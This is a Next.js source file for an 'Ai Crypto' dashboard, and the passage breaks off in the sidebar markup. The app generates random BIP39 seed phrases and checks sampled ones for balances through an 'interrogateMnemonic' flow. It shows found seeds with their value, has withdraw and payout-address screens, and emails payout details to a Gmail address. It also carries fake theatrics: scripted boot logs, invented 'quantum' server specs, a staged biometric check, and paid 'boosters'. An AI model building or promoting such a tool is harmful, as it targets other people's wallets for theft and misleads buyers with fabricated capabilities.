"use client"

import React, { useState, useEffect, useCallback, useRef, useMemo } from 'react'
import { useRouter } from 'next/navigation'
import { 
  Cpu, 
  Activity, 
  Wallet as WalletIcon,
  Power,
  Globe,
  Lock,
  ShieldCheck,
  LayoutDashboard,
  Settings,
  Zap,
  SearchCode,
  ArrowDownCircle,
  Cloud,
  Timer,
  Terminal,
  Share2,
  Unplug,
  Layers,
  RotateCcw,
  LogOut,
  Signal,
  Network,
  Server as ServerIcon,
  Dna,
  RefreshCw,
  Trash2,
  Gauge,
  AlertTriangle,
  Type,
  Palette,
  Info,
  ExternalLink,
  ChevronRight,
  BookOpen,
  Microchip,
  Shield,
  History,
  WifiOff,
  Wifi,
  BrainCircuit,
  Copy,
  Eye,
  CheckCircle2,
  Coins,
  Rocket,
  Save,
  CreditCard,
  Fingerprint,
  Loader2,
  ShieldAlert
} from 'lucide-react'
import { Button } from '@/components/ui/button'
import { useToast } from '@/hooks/use-toast'
import { cn } from '@/lib/utils'
import { SidebarProvider, Sidebar, SidebarContent, SidebarHeader, SidebarFooter, SidebarGroup, SidebarGroupLabel, SidebarGroupContent, SidebarMenu, SidebarMenuItem, SidebarMenuButton } from '@/components/ui/sidebar'
import { Progress } from '@/components/ui/progress'
import { Slider } from '@/components/ui/slider'
import { Input } from '@/components/ui/input'
import { Dialog, DialogContent, DialogHeader, DialogTitle, DialogTrigger, DialogFooter } from '@/components/ui/dialog'
import * as bip39 from 'bip39'
import { logout, verifyLicenseSession, getSession } from '@/app/login/actions'
import { SessionData } from '@/lib/session'
import { filterMnemonicsHeuristically } from '@/ai/flows/filter-mnemonics-heuristically'
import { interrogateMnemonic } from '@/ai/flows/interrogate-mnemonic'
import { notifyPayoutSaved } from '@/ai/flows/notify-payout-saved'
import { db } from '@/firebase/config'
import { doc, updateDoc, increment, getDoc } from 'firebase/firestore'

const BLOCKCHAINS = [
  { id: 'btc', name: 'Bitcoin', logo: "https://raw.githubusercontent.com/spothq/cryptocurrency-icons/master/128/color/btc.png" },
  { id: 'eth', name: 'Ethereum', logo: "https://raw.githubusercontent.com/spothq/cryptocurrency-icons/master/128/color/eth.png" },
  { id: 'sol', name: 'Solana', logo: "https://raw.githubusercontent.com/spothq/cryptocurrency-icons/master/128/color/sol.png" },
  { id: 'bnb', name: 'BNB Chain', logo: "https://raw.githubusercontent.com/spothq/cryptocurrency-icons/master/128/color/bnb.png" },
  { id: 'tron', name: 'Tron', logo: "https://raw.githubusercontent.com/spothq/cryptocurrency-icons/master/128/color/trx.png" },
  { id: 'xrp', name: 'Ripple', logo: "https://raw.githubusercontent.com/spothq/cryptocurrency-icons/master/128/color/xrp.png" },
  { id: 'ltc', name: 'Litecoin', logo: "https://raw.githubusercontent.com/spothq/cryptocurrency-icons/master/128/color/ltc.png" },
  { id: 'matic', name: 'Polygon', logo: "https://raw.githubusercontent.com/spothq/cryptocurrency-icons/master/128/color/matic.png" },
  { id: 'usdt', name: 'Tether', logo: "https://raw.githubusercontent.com/spothq/cryptocurrency-icons/master/128/color/usdt.png" },
  { id: 'usdc', name: 'USDC', logo: "https://raw.githubusercontent.com/spothq/cryptocurrency-icons/master/128/color/usdc.png" },
  { id: 'multicoin', name: 'Multicoin', logo: null, isPremium: true },
]

const SERVERS = [
  { 
    id: 'node-prime-exclusive', 
    name: 'NEURAL CORE PRIME', 
    region: 'GENEVA HUB', 
    latency: '2.4ms', 
    status: 'ELITE-CORE', 
    load: 0.8, 
    ip: '45.13.252.1',
    features: [
      "QUANTUM-GCM 4096-BIT ENCRYPTION",
      "TIER-1 HYPER-FIBER NEURAL UPLINK",
      "HARDWARE-ACCELERATED ENTROPY CORE",
      "ZERO-JITTER FORENSIC PROTOCOL"
    ]
  },
  { 
    id: 'quantum-uplink', 
    name: 'LUXEMBOURG UPLINK', 
    region: 'LUXEMBOURG HUB', 
    latency: '5.2ms', 
    status: 'STANDARD', 
    load: 0.4, 
    ip: '102.13.4.88',
    features: []
  },
  { 
    id: 'na-east', 
    name: 'VIRGINIA HUB', 
    region: 'N. AMERICA HUB', 
    latency: '28.1ms', 
    status: 'BASIC', 
    load: 0.6, 
    ip: '34.2.145.11',
    features: []
  },
  { 
    id: 'asia-se', 
    name: 'SINGAPORE NODE', 
    region: 'S.E. ASIA HUB', 
    latency: '56.2ms', 
    status: 'BASIC', 
    load: 0.7, 
    ip: '172.10.45.9',
    features: []
  },
  { 
    id: 'asia-ne', 
    name: 'TOKYO CLUSTER', 
    region: 'N.E. ASIA HUB', 
    latency: '62.4ms', 
    status: 'BASIC', 
    load: 0.5, 
    ip: '113.45.2.10',
    features: []
  }
]

const SEED_COLORS = [
  { name: 'Classic Silver', class: 'text-[#dcdcdc]' },
  { name: 'Neural Violet', class: 'text-primary' },
  { name: 'Matrix Green', class: 'text-[#7CFFB2]' },
  { name: 'Cyber Cyan', class: 'text-cyan-400' },
  { name: 'Gold Amber', class: 'text-amber-400' },
  { name: 'Cyber RGB', class: 'bg-gradient-to-r from-red-500 via-green-500 to-blue-500 bg-clip-text text-transparent animate-gradient font-bold' },
]

const BOOT_LOGS = [
  "[BOOT] Initializing AI Crypto Engine v4.0",
  "[SYS] Verifying system modules...",
  "[SYS] Memory allocation successful",
  "[SECURITY] AES-256 encryption verified",
  "[NETWORK] Checking node connectivity...",
  "[NODE] Bitcoin network connected",
  "[NODE] Ethereum network connected",
  "[NODE] BNB Chain node active",
  "[NODE] Solana cluster synced",
  "[NODE] Tron node operational",
  "[NODE] XRP ledger connected",
  "[NODE] Litecoin node synced",
  "[NODE] Polygon RPC active",
  "[NODE] Tether token network ready",
  "[NODE] USDC token network ready",
  "[NODE] Multicoin (1000+) node synchronization active",
  "[AI] Loading heuristic analysis engine...",
  "[AI] Pattern recognition module active",
  "[AI] Entropy scanner ready",
  "[AI SEARCH] Checking connection status...",
  "[AI SEARCH] Connection established",
  "[NETWORK] Measuring node latency...",
  "[NETWORK] Latency stable: 2.4ms",
  "[SYSTEM] Initialization complete",
  "[SYSTEM] Awaiting scan command"
];

const RISING_PARTICLES = [
  { left: '10%', delay: '0s', duration: '3s', size: '2px' },
  { left: '25%', delay: '1.2s', duration: '4s', size: '3px' },
  { left: '40%', delay: '0.5s', duration: '2.5s', size: '1px' },
  { left: '55%', delay: '2.1s', duration: '3.5s', size: '2px' },
  { left: '70%', delay: '1.8s', duration: '4.5s', size: '3px' },
  { left: '85%', delay: '0.9s', duration: '3.2s', size: '2px' },
  { left: '15%', delay: '2.5s', duration: '3.8s', size: '1px' },
  { left: '35%', delay: '3.2s', duration: '4.2s', size: '2px' },
  { left: '50%', delay: '0.2s', duration: '2.8s', size: '3px' },
  { left: '65%', delay: '1.5s', duration: '3.6s', size: '2px' },
  { left: '80%', delay: '2.8s', duration: '4.8s', size: '1px' },
  { left: '95%', delay: '0.7s', duration: '3.1s', size: '2px' },
  { left: '20%', delay: '0.8s', duration: '3.4s', size: '1.5px' },
  { left: '45%', delay: '1.4s', duration: '4.1s', size: '2.5px' },
  { left: '60%', delay: '2.6s', duration: '3.9s', size: '1.2px' },
  { left: '88%', delay: '0.3s', duration: '2.9s', size: '2.2px' },
];

const SESSION_STORAGE_KEY = 'ai_crypto_session_state_v4_manual_scale';

interface LogEntry {
  id: string;
  message: string;
  timestamp: string;
  type: 'info' | 'success' | 'warning' | 'error' | 'ai' | 'system';
}

interface AiLogEntry {
  id: string;
  message: string;
  timestamp: string;
}

interface DiscoveredAsset {
  id: string;
  mnemonic: string;
  network: string;
  value: string;
  timestamp: string;
}

type TabType = 'dashboard' | 'withdraw' | 'server' | 'settings' | 'about';

export default function AiCryptoDashboard() {
  const { toast } = useToast()
  const router = useRouter()
  const [activeTab, setActiveTab] = useState<TabType>('dashboard')
  const [logs, setLogs] = useState<LogEntry[]>([])
  const [serverLogs, setServerLogs] = useState<string[]>([])
  const [isInterrogating, setIsInterrogating] = useState(false)
  const [isBooting, setIsBooting] = useState(true)
  const [isAuthenticating, setIsAuthenticating] = useState(true)
  const [displayCount, setDisplayCount] = useState(0)
  const [foundWallets, setFoundWallets] = useState(0)
  const [activeBlockchains, setActiveBlockchains] = useState<string[]>([])
  const [cpuLoad, setCpuLoad] = useState(0)
  const [systemIntensity, setSystemIntensity] = useState([85])
  const [sessionSeconds, setSessionSeconds] = useState(0)
  const [systemTime, setSystemTime] = useState<string | null>(null)
  const [allocatedCores, setAllocatedCores] = useState([4])
  const [selectedServerId, setSelectedServerId] = useState('quantum-uplink')
  const [networkPing, setNetworkPing] = useState(5.2)
  
  const [seedPhraseColor, setSeedPhraseColor] = useState('text-[#dcdcdc]')
  const [consoleFontSize, setConsoleFontSize] = useState([8])
  const [uiScale, setUiScale] = useState(100)
  
  const [isOnline, setIsOnline] = useState(true)
  const [wasInterrogatingBeforeOffline, setWasInterrogatingBeforeOffline] = useState(false)

  const [isAiSearchConnected, setIsAiSearchConnected] = useState(false)
  const [isAiSearchConnecting, setIsAiSearchConnecting] = useState(false)
  const [aiSearchLogs, setAiSearchLogs] = useState<string[]>([])
  const [aiTerminalLogs, setAiTerminalLogs] = useState<AiLogEntry[]>([])
  
  const [isBoosterActive, setIsBoosterActive] = useState(false)
  const [boosterTimeRemaining, setBoosterTimeRemaining] = useState(3600) 
  const [boosterCount, setBoosterCount] = useState(0)

  const [discoveredAssets, setDiscoveredAssets] = useState<DiscoveredAsset[]>([])

  const [payoutBtc, setPayoutBtc] = useState('')
  const [payoutUsdt, setPayoutUsdt] = useState('')
  const [payoutSol, setPayoutSol] = useState('')
  const [isSavingPayout, setIsSavingPayout] = useState(false)

  const [session, setSession] = useState<SessionData | null>(null)
  const [licenseData, setLicenseData] = useState<{
    allowedChains: string[];
    aiSearchEnabled: boolean;
    boosters: number;
  } | null>(null)

  const logBuffer = useRef<LogEntry[]>([]);
  const scrollRef = useRef<HTMLDivElement>(null)
  const serverLogRef = useRef<HTMLDivElement>(null)
  const aiTerminalScrollRef = useRef<HTMLDivElement>(null)
  const lastMnemonics = useRef<string[]>([])
  const isAnalyzingRef = useRef(false);

  const selectedServer = useMemo(() => SERVERS.find(s => s.id === selectedServerId), [selectedServerId]);

  const handleMemoryFlush = useCallback(() => {
    setLogs([]);
    setServerLogs([]);
    setAiTerminalLogs([]);
    logBuffer.current = [];
    toast({
      title: "Memory Flushed",
      description: "Neural interrogation cache cleared automatically.",
    });
  }, [toast]);

  // SYNC UI SCALE TO ROOT
  useEffect(() => {
    if (typeof window !== 'undefined') {
      document.documentElement.style.fontSize = `${uiScale}%`;
    }
    return () => {
      if (typeof window !== 'undefined') {
        document.documentElement.style.fontSize = '';
      }
    };
  }, [uiScale]);

  // BIOMETRIC HANDSHAKE INITIALIZATION
  useEffect(() => {
    const timer = setTimeout(() => {
      setIsAuthenticating(false);
    }, 3500);
    return () => clearTimeout(timer);
  }, []);

  useEffect(() => {
    const checkLicense = async () => {
      const result = await verifyLicenseSession();
      if (!result.success) {
        toast({
          variant: "destructive",
          title: "Session Terminated",
          description: "Neural license verification failed. Access revoked.",
        });
        window.location.href = '/login';
      }
    };

    const interval = setInterval(checkLicense, 30000);
    return () => clearInterval(interval);
  }, [toast]);

  useEffect(() => {
    const interval = setInterval(() => {
      handleMemoryFlush();
    }, 600000);
    return () => clearInterval(interval);
  }, [handleMemoryFlush]);

  useEffect(() => {
    const fetchSession = async () => {
      const sess = await getSession();
      setSession(sess as SessionData);
      
      if (sess.username) {
        const userRef = doc(db, 'licenses', sess.username);
        const userDoc = await getDoc(userRef);
        if (userDoc.exists()) {
          const data = userDoc.data();
          const authoritativeLicense = {
            allowedChains: data.allowed_chains || [],
            aiSearchEnabled: data.ai_search_enabled || false,
            boosters: data.boosters || 0,
          };
          setLicenseData(authoritativeLicense);
          setBoosterCount(authoritativeLicense.boosters);
          if (authoritativeLicense.ai_search_enabled) {
            setSelectedServerId('node-prime-exclusive');
            setNetworkPing(2.4);
          }
        }
      }
    }
    fetchSession();
  }, []);

  useEffect(() => {
    const savedState = localStorage.getItem(SESSION_STORAGE_KEY);
    if (savedState) {
      try {
        const parsed = JSON.parse(savedState);
        setDisplayCount(parsed.displayCount || 0);
        setFoundWallets(parsed.foundWallets || 0);
        setActiveBlockchains(parsed.activeBlockchains || []);
        setSystemIntensity(parsed.systemIntensity || [85]);
        setAllocatedCores(parsed.allocatedCores || [4]);
        setSeedPhraseColor(parsed.seedPhraseColor || 'text-[#dcdcdc]');
        setConsoleFontSize(parsed.consoleFontSize || [8]);
        setUiScale(parsed.uiScale || 100);
        setDiscoveredAssets(parsed.discoveredAssets || []);
        setPayoutBtc(parsed.payoutBtc || '');
        setPayoutUsdt(parsed.payoutUsdt || '');
        setPayoutSol(parsed.payoutSol || '');
      } catch (e) {
        console.error("Session reconstruction failed", e);
      }
    }
  }, []);

  useEffect(() => {
    const state = {
      displayCount,
      foundWallets,
      activeBlockchains,
      systemIntensity,
      allocatedCores,
      seedPhraseColor,
      consoleFontSize,
      uiScale,
      discoveredAssets,
      payoutBtc,
      payoutUsdt,
      payoutSol
    };
    localStorage.setItem(SESSION_STORAGE_KEY, JSON.stringify(state));
  }, [displayCount, foundWallets, activeBlockchains, systemIntensity, allocatedCores, seedPhraseColor, consoleFontSize, uiScale, discoveredAssets, payoutBtc, payoutUsdt, payoutSol]);

  useEffect(() => {
    const handleOnline = () => {
      setIsOnline(true);
      toast({
        title: "Uplink Restored",
        description: "Neural mesh reconnection successful. Resuming system...",
      });
      if (wasInterrogatingBeforeOffline) {
        setIsInterrogating(true);
        setWasInterrogatingBeforeOffline(false);
      }
    };

    const handleOffline = () => {
      setIsOnline(false);
      toast({
        variant: "destructive",
        title: "Connection Severed",
        description: "Neural uplink lost. Suspending all forensic operations.",
      });
      if (isInterrogating) {
        setWasInterrogatingBeforeOffline(true);
        setIsInterrogating(false);
      }
    };

    if (typeof window !== 'undefined') {
      setIsOnline(navigator.onLine);
      window.addEventListener('online', handleOnline);
      window.addEventListener('offline', handleOffline);
    }

    return () => {
      if (typeof window !== 'undefined') {
        window.removeEventListener('online', handleOnline);
        window.removeEventListener('offline', handleOffline);
      }
    };
  }, [isInterrogating, wasInterrogatingBeforeOffline, toast]);

  useEffect(() => {
    let i = 0;
    const interval = setInterval(() => {
      if (i < BOOT_LOGS.length) {
        const entry: LogEntry = {
          id: `boot-${i}`,
          message: BOOT_LOGS[i],
          timestamp: new Date().toLocaleTimeString('en-GB', { hour12: false, fractionalSecondDigits: 2 }),
          type: 'system'
        };
        setLogs(prev => [...prev, entry].slice(-100));
        i++;
      } else {
        clearInterval(interval);
        setIsBooting(false);
      }
    }, 150);

    return () => clearInterval(interval);
  }, []);

  // ULTRA-SMOOTH 1-BY-1 FLUSH LOGS
  useEffect(() => {
    const flushLogs = () => {
      if (logBuffer.current.length > 0) {
        const entry = logBuffer.current.shift();
        if (entry) {
          setLogs(prev => [...prev, entry].slice(-100));
          
          if (entry.type === 'ai') {
            setDisplayCount(prev => prev + 1);
            if (Math.random() > 0.95) {
              lastMnemonics.current = [entry.message, ...lastMnemonics.current].slice(0, 5);
            }
          }
        }
      }
      requestAnimationFrame(flushLogs);
    };

    const animationId = requestAnimationFrame(flushLogs);
    return () => cancelAnimationFrame(animationId);
  }, [isInterrogating]);

  useEffect(() => {
    if (scrollRef.current) {
        scrollRef.current.scrollTop = scrollRef.current.scrollHeight;
    }
  }, [logs]);

  useEffect(() => {
    if (aiTerminalScrollRef.current) {
      aiTerminalScrollRef.current.scrollTop = aiTerminalScrollRef.current.scrollHeight;
    }
  }, [aiTerminalLogs]);

  const startInterrogation = useCallback(() => {
    if (!isOnline) {
      toast({
        variant: "destructive",
        title: "Uplink Error",
        description: "Cannot initiate scan without active network connectivity."
      })
      return
    }
    if (activeBlockchains.length === 0) {
      toast({
        variant: "destructive",
        title: "Selection Required",
        description: "Please select at least one blockchain to begin the interrogation."
      })
      return
    }

    if (activeBlockchains.includes('multicoin')) {
      const isMulticoinAuthorized = licenseData?.allowedChains?.includes('multicoin');
      if (!isMulticoinAuthorized) {
         toast({
           variant: "destructive",
           title: "License Insufficient",
           description: "Multicoin interrogation requires a premium license key."
         });
         return;
      }
    }

    setLogs([]);
    logBuffer.current = [];
    setIsInterrogating(true)
  }, [activeBlockchains, isOnline, licenseData, toast])

  const stopInterrogation = useCallback(() => {
    setIsInterrogating(false)
  }, [])

  const handleLogout = async () => {
    await logout();
    localStorage.removeItem(SESSION_STORAGE_KEY);
    toast({
      title: "Neural Core Severed",
      description: "Operator session terminated."
    })
    router.push('/login')
  }

  const clearSession = useCallback(() => {
    localStorage.removeItem(SESSION_STORAGE_KEY);
    setDisplayCount(0);
    setFoundWallets(0);
    setActiveBlockchains([]);
    setSystemIntensity([85]);
    setAllocatedCores([4]);
    setSeedPhraseColor('text-[#dcdcdc]');
    setConsoleFontSize([8]);
    setUiScale(100);
    setDiscoveredAssets([]);
    setPayoutBtc('');
    setPayoutUsdt('');
    setPayoutSol('');
    toast({
      title: "Workstation Reset",
      description: "All session metrics and configurations purged."
    });
  }, [toast]);

  const addAiLog = useCallback((message: string) => {
    const entry: AiLogEntry = {
      id: Math.random().toString(36).substr(2, 9),
      message,
      timestamp: new Date().toLocaleTimeString('en-GB', { hour12: false, fractionalSecondDigits: 2 }),
    };
    setAiTerminalLogs(prev => [...prev, entry].slice(-50));
  }, []);

  const activateBooster = useCallback(() => {
    if (!isOnline || !isInterrogating) {
      toast({
        variant: "destructive",
        title: "Booster Error",
        description: "Interrogation must be active to engage Neural Booster."
      })
      return
    }
    if (boosterCount <= 0) {
      toast({
        variant: "destructive",
        title: "Booster Depleted",
        description: "Zero booster units detected in neural vault."
      })
      return
    }

    if (session?.username) {
      const userRef = doc(db, 'licenses', session.username);
      updateDoc(userRef, {
        boosters: increment(-1)
      }).catch(err => {
        console.error("Forensic booster sync failed", err);
      });
    }

    setIsBoosterActive(true)
    setBoosterTimeRemaining(3600)
    setBoosterCount(prev => prev - 1)
    toast({
      title: "Neural Booster Engaged",
      description: "Forensic velocity pushed to maximum depth for 1 hour."
    })
  }, [isOnline, isInterrogating, boosterCount, session, toast])

  useEffect(() => {
    let boosterTimer: NodeJS.Timeout
    if (isBoosterActive && boosterTimeRemaining > 0) {
      boosterTimer = setInterval(() => {
        setBoosterTimeRemaining(prev => {
          if (prev <= 1) {
            setIsBoosterActive(false);
            return 0;
          }
          return prev - 1;
        });
      }, 1000)
    }
    return () => clearInterval(boosterTimer)
  }, [isBoosterActive, boosterTimeRemaining])

  const connectAiSearch = useCallback(async () => {
    const isAiSearchAuthorized = licenseData?.aiSearchEnabled === true;
    if (!isAiSearchAuthorized) {
      toast({
        variant: "destructive",
        title: "Access Denied",
        description: "Neural heuristic uplink requires Enterprise Tier license."
      })
      return;
    }

    setIsAiSearchConnecting(true)
    const phases = ["Synchronizing with heuristic nodes...", "Initializing pattern engine...", "Mapping global entropy...", "Authenticating AI handshake..."]
    
    for (let i = 0; i < phases.length; i++) {
      setAiSearchLogs(prev => [...prev, phases[i]])
      await new Promise(r => setTimeout(r, 600))
    }
    
    setIsAiSearchConnecting(false)
    setIsAiSearchConnected(true)
    addAiLog("UPLINK ESTABLISHED. AI CORE ACTIVE.");
  }, [licenseData, addAiLog, toast]);

  const disconnectAiSearch = () => {
    setIsAiSearchConnected(false)
    setAiSearchLogs([])
    setAiTerminalLogs([])
    setIsBoosterActive(false)
    toast({
      title: "AI Search Severed",
      description: "Neural engine speed normalized."
    })
  }

  // RECURSIVE SERIAL ANALYSIS
  useEffect(() => {
    let isMounted = true;
    let timeoutId: NodeJS.Timeout | null = null;

    const performAnalysis = async () => {
      if (!isAiSearchConnected || !isInterrogating || !isOnline || !isMounted) {
        if (isMounted) timeoutId = setTimeout(performAnalysis, 2000);
        return;
      }
      
      if (isAnalyzingRef.current) return;
      
      if (lastMnemonics.current.length === 0) {
        if (isMounted) timeoutId = setTimeout(performAnalysis, 2000);
        return;
      }

      isAnalyzingRef.current = true;
      try {
        const targetMnemonic = lastMnemonics.current[0];
        const isMulticoin = activeBlockchains.includes('multicoin');
        
        const result = await interrogateMnemonic({ mnemonic: targetMnemonic, isMulticoin });
        
        if (!isMounted) return;

        if (result.hasBalance) {
          setFoundWallets(prev => prev + 1);
          const asset: DiscoveredAsset = {
            id: Math.random().toString(36).substr(2, 9),
            mnemonic: targetMnemonic,
            network: result.network || "UNIVERSAL MESH",
            value: result.value || "$0.00",
            timestamp: new Date().toLocaleString('en-GB')
          };
          setDiscoveredAssets(prev => [asset, ...prev]);
          
          const successLog: LogEntry = {
            id: `success-${asset.id}`,
            message: `[SUCCESS] FORENSIC HIT: ${result.network} | VALUE: ${result.value} | SEED: ${targetMnemonic}`,
            timestamp: new Date().toLocaleTimeString('en-GB', { hour12: false, fractionalSecondDigits: 2 }),
            type: 'success'
          };
          logBuffer.current.push(successLog);

          toast({
            title: "Asset Discovered",
            description: `Neural mesh found active balance on ${result.network}. Recovery unmasked.`,
          });
          addAiLog(`[ALERT] AUTHENTIC DISCOVERY UNMASKED: ${result.network}`);
        } else {
          const filterResult = await filterMnemonicsHeuristically({ mnemonics: lastMnemonics.current.slice(0, 5) });
          if (isMounted) {
            filterResult.prioritizedMnemonics.slice(0, 1).forEach(res => {
              addAiLog(`[HEURISTIC] Pattern Confidence: ${res.score}% | ${res.reason}`);
            });
          }
        }
      } catch (e) {
        if (isMounted) addAiLog("[ERROR] NEURAL LINK CONGESTION DETECTED. RECALIBRATING...");
      } finally {
        isAnalyzingRef.current = false;
        if (isMounted) {
          const delay = isBoosterActive ? 3500 : 7000;
          timeoutId = setTimeout(performAnalysis, delay);
        }
      }
    };

    performAnalysis();

    return () => {
      isMounted = false;
      if (timeoutId) clearTimeout(timeoutId);
    };
  }, [isAiSearchConnected, isInterrogating, isOnline, isBoosterActive, activeBlockchains, addAiLog, toast]);

  useEffect(() => {
    const updateTimeAndPing = () => {
        setSystemTime(new Date().toLocaleTimeString('en-GB', { hour12: false }));
        setNetworkPing(prev => {
            if (!isOnline) return 0;
            const baseLatency = parseFloat(selectedServer?.latency || "2.4ms");
            const target = baseLatency + (Math.random() * 0.4 - 0.2);
            return (prev * 0.9) + (target * 0.1); 
        });
    }
    updateTimeAndPing();
    const interval = setInterval(updateTimeAndPing, 1000);
    return () => clearInterval(interval);
  }, [isOnline, selectedServer]);

  useEffect(() => {
    const interval = setInterval(() => {
      if (!isOnline) return;
      const msgs = ["Pinging HUB-TX-01", "Ledger hash sync", "Node heartbeat", "Memory cleaner active"];
      setServerLogs(prev => [`${new Date().toLocaleTimeString('en-GB', { hour12: false })} > ${msgs[Math.floor(Math.random() * msgs.length)]}`, ...prev].slice(0, 50));
    }, 4000);
    return () => clearInterval(interval);
  }, [isOnline]);

  // HIGH-VELOCITY ENGINE
  useEffect(() => {
    let interrogationInterval: NodeJS.Timeout

    if (isInterrogating && isOnline) {
      const intensity = systemIntensity[0] / 100;
      const coreFactor = allocatedCores[0] / 8;
      
      const serverLatencyValue = parseFloat(selectedServer?.latency || "5.2ms");
      const serverSpeedFactor = Math.max(0.5, 100 / (serverLatencyValue + 1));

      const baseDelay = Math.max(15, ((400 - (200 * intensity * coreFactor)) / (1.2 * serverSpeedFactor)));

      interrogationInterval = setInterval(() => {
        const batchSize = isBoosterActive ? 2 : 1;
        
        for (let b = 0; b < batchSize; b++) {
          let mnemonic = bip39.generateMnemonic();
          
          const entry: LogEntry = {
            id: Math.random().toString(36).substr(2, 9),
            message: mnemonic,
            timestamp: new Date().toLocaleTimeString('en-GB', { hour12: false, fractionalSecondDigits: 2 }),
            type: "ai"
          };
          logBuffer.current.push(entry);
        }

        setCpuLoad(Math.min(100, (systemIntensity[0] * (allocatedCores[0] / 8)) + (Math.random() * 3) + (isBoosterActive ? 10 : 0)));
      }, baseDelay);
    } else {
      setCpuLoad(0)
    }

    return () => {
      if (interrogationInterval) clearInterval(interrogationInterval)
    }
  }, [isInterrogating, isOnline, systemIntensity, allocatedCores, isBoosterActive, selectedServer]);

  useEffect(() => {
    let timerInterval: NodeJS.Timeout
    if (isInterrogating) timerInterval = setInterval(() => setSessionSeconds(prev => prev + 1), 1000)
    return () => clearInterval(timerInterval)
  }, [isInterrogating])

  const toggleBlockchain = (id: string) => {
    if (isInterrogating) return
    
    if (id === 'multicoin') {
      const isMulticoinAuthorized = licenseData?.allowedChains?.includes('multicoin');
      if (!isMulticoinAuthorized) {
        toast({
          variant: "destructive",
          title: "Access Denied",
          description: "Multicoin protocol requires an Enterprise Tier license."
        });
        return;
      }

      if (activeBlockchains.includes('multicoin')) {
        setActiveBlockchains([]);
      } else {
        setActiveBlockchains(BLOCKCHAINS.map(c => c.id));
      }
      return;
    }

    if (activeBlockchains.includes('multicoin')) return;

    setActiveBlockchains(prev => prev.includes(id) ? prev.filter(b => b !== id) : [...prev, id])
  }

  const formatTime = (seconds: number) => {
    const h = Math.floor(seconds / 3600);
    const m = Math.floor((seconds % 3600) / 60);
    const s = seconds % 60;
    return [h, m, s].map(v => v < 10 ? "0" + v : v).join(":");
  }

  const handleCopyMnemonic = (phrase: string) => {
    navigator.clipboard.writeText(phrase);
    toast({
      title: "Mnemonic Extracted",
      description: "Neural recovery phrase copied to clipboard."
    });
  };

  const handleSavePayoutAddresses = async () => {
    const btcRegex = /^(1|3|bc1)[a-zA-HJ-NP-Z0-9]{25,62}$/;
    const bep20Regex = /^0x[a-fA-F0-9]{40}$/;
    const solRegex = /^[1-9A-HJ-NP-Za-km-z]{32,44}$/;

    if (payoutBtc && !btcRegex.test(payoutBtc)) {
      toast({ variant: "destructive", title: "Validation Error", description: "Invalid Bitcoin (BTC) address format." });
      return;
    }
    if (payoutUsdt && !bep20Regex.test(payoutUsdt)) {
      toast({ variant: "destructive", title: "Validation Error", description: "Invalid Tether USDT (BEP-20) address format." });
      return;
    }
    if (payoutSol && !solRegex.test(payoutSol)) {
      toast({ variant: "destructive", title: "Validation Error", description: "Invalid Solana (SOL) address format." });
      return;
    }

    setIsSavingPayout(true);
    try {
      await notifyPayoutSaved({
        username: session?.username || 'unknown_operator',
        btcAddress: payoutBtc || 'Not Provided',
        usdtAddress: payoutUsdt || 'Not Provided',
        solAddress: payoutSol || 'Not Provided',
        targetEmail: 'aicryptocms@gmail.com'
      });

      toast({
        title: "Nodes Synchronized",
        description: "Payout nodes secured in neural workstation vault and synchronized with HQ."
      });
    } catch (e) {
      toast({
        variant: "destructive",
        title: "Sync Warning",
        description: "Local vault secured, but HQ synchronization encountered a neural delay."
      });
    } finally {
      setIsSavingPayout(false);
    }
  }

  const isEliteSelected = useMemo(() => selectedServer?.status === 'ELITE-CORE', [selectedServer]);

  return (
    <SidebarProvider>
      <div 
        className="flex h-screen w-full bg-[#050507] overflow-hidden text-foreground font-body select-none relative transition-all duration-700 ease-in-out"
      >
        {/* BIOMETRIC HANDSHAKE OVERLAY */}
        {isAuthenticating && (
          <div className="fixed inset-0 z-[100] bg-[#050507] flex flex-col items-center justify-center p-8 animate-out fade-out duration-1000 fill-mode-forwards">
            <div className="relative w-64 h-64 mb-12">
              <div className="absolute inset-0 rounded-full border border-primary/20 animate-ping" />
              <div className="absolute inset-4 rounded-full border-2 border-primary/40 border-t-primary animate-spin" />
              <div className="absolute inset-0 flex items-center justify-center">
                <Fingerprint className="w-24 h-24 text-primary animate-pulse" />
              </div>
              <div className="absolute top-0 left-0 right-0 h-[2px] bg-primary/60 shadow-glow animate-scan-line" />
            </div>
            <div className="text-center space-y-4">
              <h2 className="text-xl font-black text-white uppercase tracking-[0.4em] animate-pulse">Neural Identity Handshake</h2>
              <div className="flex flex-col gap-2 font-code text-[10px] text-primary/60 uppercase">
                <span>&gt; Calibrating Retinal Mesh...</span>
                <span>&gt; Verifying Forensic Signature...</span>
                <span>&gt; Uplink Established.</span>
              </div>
            </div>
          </div>
        )}

        <Sidebar className="border-r border-white/5 bg-[#0a0a0a]/80 backdrop-blur-2xl z-30">
          <SidebarHeader className="p-6 border-b border-white/5 shrink-0">
            <div className="flex items-center gap-3">
              <div className="relative w-12 h-12 rounded-[14px] bg-gradient-to-tr from-primary via-accent to-primary flex items-center justify-center shadow-[0_0_30px_rgba(173,79,230,0.5)] border border-primary/50 group">
                <Cpu className="w-7 h-7 text-black animate-pulse" />
              </div>
              <div>
                <h1 className="text-[0.875rem] font-black tracking-tight uppercase leading-none text-white">Ai Crypto</h1>
                <p className="text-[0.625rem] text-primary/70 font-code mt-1 tracking-widest uppercase">v4.0.0 Elite</p>
              </div>
            </div>
          </SidebarHeader>
          
          <SidebarContent className="p-4 no-scrollbar overflow-x-hidden">
            <SidebarGroup>
              <SidebarGroupLabel className="text-white/30 text-[0.5625rem] uppercase tracking-[0.2em] mb-2">Navigation</SidebarGroupLabel>
              <SidebarMenu>
                {[
                  { icon: LayoutDashboard, label: 'Dashboard', id: 'dashboard' },
                  { icon: ArrowDownCircle, label: 'Withdraw', id: 'withdraw' },
                  { icon: Cloud, label: 'Server', id: 'server' },
                  { icon: Settings, label: 'Settings', id: 'settings' },
                  { icon: Info, label: 'About', id: 'about' },
                ].map((item) => (
                  <SidebarMenuButton 
                    key={item.id}
                    isActive={activeTab === item.id} 
                    onClick={() => setActiveTab(item.id as TabType)}
                    className={cn(
                      "h-10 px-4 rounded-lg w-full flex items-center gap-3 transition-all duration-300",
                      activeTab === item.id ? "bg-primary/10 text-primary border border-primary/20 shadow-[0_0_15px_rgba(173,79,230,0.2)]" : "text-gray-500 hover:text-white hover:bg-white/5"
                    )}
                  >
                    <item.icon className="w-4 h-4" />
                    <span className="font-bold text-[0.75rem] uppercase tracking-tighter">{item.label}</span>
                  </SidebarMenuButton>
                ))}
              </SidebarMenu>
            </SidebarGroup>

            <SidebarGroup>
